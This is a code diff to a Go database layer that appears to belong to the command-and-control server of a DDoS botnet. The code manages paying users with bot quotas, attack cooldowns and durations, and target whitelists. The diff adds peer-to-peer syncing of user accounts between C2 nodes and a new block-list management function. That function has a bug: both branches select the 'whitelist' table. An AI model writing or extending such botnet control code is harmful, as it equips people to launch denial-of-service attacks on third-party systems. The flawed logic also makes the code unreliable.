@@ -2,12 +2,14 @@ package main
 
 import (
 	"database/sql"
+	"encoding/binary"
+	"errors"
 	"fmt"
 	"net"
-	"encoding/binary"
+	"strings"
 	"time"
+
 	_ "github.com/go-sql-driver/mysql"
-	"errors"
 )
 
 type Database struct {
@@ -84,6 +86,9 @@ func (this *Database) CreateUser(username string, password string, max_bots int,
 		return false
 	}
 	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
+	if peerMgr != nil {
+		peerMgr.BroadcastUserAdd(username, password, max_bots, duration, cooldown, 0)
+	}
 	return true
 }
 
@@ -97,20 +102,78 @@ func (this *Database) CreateAdmin(username string, password string, max_bots int
 		return false
 	}
 	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
+	if peerMgr != nil {
+		peerMgr.BroadcastUserAdd(username, password, max_bots, duration, cooldown, 1)
+	}
 	return true
 }
 
 func (this *Database) RemoveUser(username string) bool {
-	rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
+	result, err := this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
 	if err != nil {
 		fmt.Println(err)
 		return false
 	}
-	if rows.Next() {
+	affected, _ := result.RowsAffected()
+	if affected == 0 {
 		return false
 	}
-	this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
+	if peerMgr != nil {
+		peerMgr.BroadcastUserDel(username)
+	}
 	return true
+}
+
+func (this *Database) ManageBlacklist(action, cidr string, isBlacklist bool) error {
+	table := "whitelist"
+	if isBlacklist {
+		table = "whitelist"
+	}
+
+	parts := strings.SplitN(cidr, "/", 2)
+	prefix := parts[0]
+	netmask := "32"
+	if len(parts) >= 2 {
+		netmask = parts[1]
+	}
+
+	switch action {
+	case "add":
+		_, err := this.db.Exec(
+			fmt.Sprintf("INSERT INTO %s (prefix, netmask) VALUES (?, ?) ON DUPLICATE KEY UPDATE netmask=?", table),
+			prefix, netmask, netmask)
+		return err
+	case "del", "delete", "remove":
+		result, err := this.db.Exec(
+			fmt.Sprintf("DELETE FROM %s WHERE prefix = ?", table), prefix)
+		if err != nil {
+			return err
+		}
+		n, _ := result.RowsAffected()
+		if n == 0 {
+			return fmt.Errorf("prefix %s not found", prefix)
+		}
+		return nil
+	case "list":
+		rows, err := this.db.Query(fmt.Sprintf("SELECT prefix, netmask FROM %s ORDER BY prefix", table))
+		if err != nil {
+			return err
+		}
+		defer rows.Close()
+		var entries []string
+		for rows.Next() {
+			var p string
+			var n int
+			rows.Scan(&p, &n)
+			entries = append(entries, fmt.Sprintf("  %s/%d", p, n))
+		}
+		if len(entries) == 0 {
+			return fmt.Errorf("(empty)")
+		}
+		return fmt.Errorf("ok:%s", strings.Join(entries, "\r\n"))
+	default:
+		return fmt.Errorf("unknown action: %s (use add/del/list)", action)
+	}
 }
 
 func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
